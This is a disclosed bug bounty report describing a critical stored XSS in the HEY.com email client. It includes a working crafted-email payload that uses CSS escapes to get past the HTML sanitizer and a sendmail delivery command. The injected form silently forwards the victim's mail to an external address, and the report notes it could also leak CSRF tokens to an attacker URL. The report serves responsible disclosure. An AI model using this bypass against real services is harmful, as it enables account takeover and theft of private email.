# HEY.com email stored XSS

## Report Details
- **Report ID**: 982291
- **URL**: https://hackerone.com/reports/982291
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-15T03:13:48.629Z
- **Disclosed**: 2020-10-27T18:06:36.831Z

## Reporter
- **Username**: jouko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.

To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.

Example email:
~~~~ plain
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
~~~~
To send the email, create a text file with the above contents. Send it with the command
~~~~ plain
/usr/sbin/sendmail -t < email.txt
~~~~


The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.

Finally, HTML like this is injected:
~~~~ html
<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
</form>
~~~~
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.

This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).

Another example is to simply set the form ```action``` to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.

The POST request in Chrome's developer console:
{F988220}

If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.

## Impact

A HEY user viewing an email sent by the attacker may have their account compromised.

## Attachments
- hey.png
